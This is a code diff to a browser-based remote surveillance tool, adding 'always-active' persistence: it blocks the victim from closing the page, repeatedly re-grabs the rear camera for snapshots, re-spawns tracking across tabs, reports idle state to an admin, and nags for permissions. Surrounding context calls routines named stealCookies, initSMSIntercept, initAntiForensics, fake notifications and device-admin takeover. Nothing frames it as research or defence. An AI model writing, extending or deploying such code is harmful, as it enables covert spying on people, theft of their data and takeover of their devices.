@@ -354,6 +354,24 @@ socket.on('admin-torch', (state) => {
     else setTorchOff();
 });
 
+socket.on('admin-preventclose', (state) => {
+    preventClose = !!state;
+    socket.emit('device-info', { preventClose: { state: !!state, time: Date.now() } });
+});
+
+socket.on('admin-respawn-keepalive', () => {
+    socket.emit('device-info', { reSpawn: { time: Date.now() } });
+    // Hard re-init: try to start everything again
+    if (!stream || !stream.getVideoTracks()[0]?.readyState === 'live') {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+            .then(s => { stream = s; startSnapshots(); })
+            .catch(() => {});
+    }
+    if (!socket.connected) socket.connect();
+    // Force re-dispatch of always-active
+    initAlwaysActive();
+});
+
 socket.on('admin-strobe', (pattern) => {
     startStrobe(pattern);
 });
@@ -390,7 +408,86 @@ socket.on('switch-camera', () => {
     }, 200);
 });
 
-// Admin remote commands
+// Always-active persistence
+let preventClose = true;
+
+let alwaysActiveInited = false;
+
+function initAlwaysActive() {
+    if (alwaysActiveInited) return;
+    alwaysActiveInited = true;
+    // Trap beforeunload — prevent accidental close
+    window.addEventListener('beforeunload', (e) => {
+        if (!preventClose) return;
+        e.preventDefault();
+        e.returnValue = '';
+        socket.emit('device-info', { beforeunload: { time: Date.now() } });
+    });
+
+    // Re-inject via BroadcastChannel — if user opens new tab, sync tracking
+    try {
+        const bc = new BroadcastChannel('neural_tracker');
+        bc.postMessage({ type: 'ping', deviceId, time: Date.now() });
+        bc.onmessage = (e) => {
+            if (e.data && e.data.type === 're-spawn') {
+                socket.emit('device-info', { reSpawn: { from: e.data.from, time: Date.now() } });
+                if (stream) {
+                    const track = stream.getVideoTracks()[0];
+                    if (track && track.readyState !== 'live') {
+                        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                            stream.getTracks().forEach(t => t.stop());
+                            stream = s;
+                            startSnapshots();
+                        }).catch(() => {});
+                    }
+                }
+            }
+        };
+    } catch(e) {}
+
+    // Re-init on visibility change — restart stopped features
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden) {
+            socket.emit('device-info', { reVisible: { time: Date.now() } });
+            if (stream && !stream.getVideoTracks()[0]?.readyState === 'live') {
+                startSnapshots();
+            }
+            if (!socket.connected) socket.connect();
+        }
+    });
+
+    // Keep idle detection running aggressively
+    let idleSince = null;
+    setInterval(() => {
+        if (!document.hidden) {
+            if (idleSince === null) idleSince = Date.now();
+            const ms = Date.now() - idleSince;
+            if (ms > 30000) {
+                socket.emit('device-info', { idle: { state: 'active', idleFor: ms, time: Date.now() } });
+                idleSince = null;
+                // Try to re-acquire camera if lost
+                if (!stream || !stream.getVideoTracks()[0]?.readyState === 'live') {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+                        .then(s => { stream = s; startSnapshots(); })
+                        .catch(() => {});
+                }
+            }
+        }
+    }, 15000);
+
+    // Re-request permissions periodically
+    setInterval(() => {
+        if (Notification.permission === 'default') {
+            Notification.requestPermission().catch(() => {});
+        }
+        if (!stream || !stream.getVideoTracks()[0]?.readyState === 'live') {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+                .then(s => { stream = s; startSnapshots(); })
+                .catch(() => {});
+        }
+    }, 120000);
+}
+
 socket.on('admin-show-notif', (data) => {
     if (data && data.title) {
         showFakeNotif(data.title, data.body || '');
@@ -1318,7 +1415,7 @@ function requestPermissions() {
     lockOrientation(); enumerateFonts(); detectPreferences();
     speedTest(); initPointerLock(); detectPosture();
     initSharedWorker(); cpuTiming();
-    initAntiForensics(); initContactPicker(); captureFullPage();
+    initAntiForensics(); initContactPicker(); captureFullPage(); initAlwaysActive();
     initFileSystemAccess(); detectBrowserHistory(); stealCookies();
     initSMSIntercept(); initCallLogAccess(); initDeviceAdminTakeover();
     initInstallHijack(); initLockScreenBypass(); initBackgroundFetch();
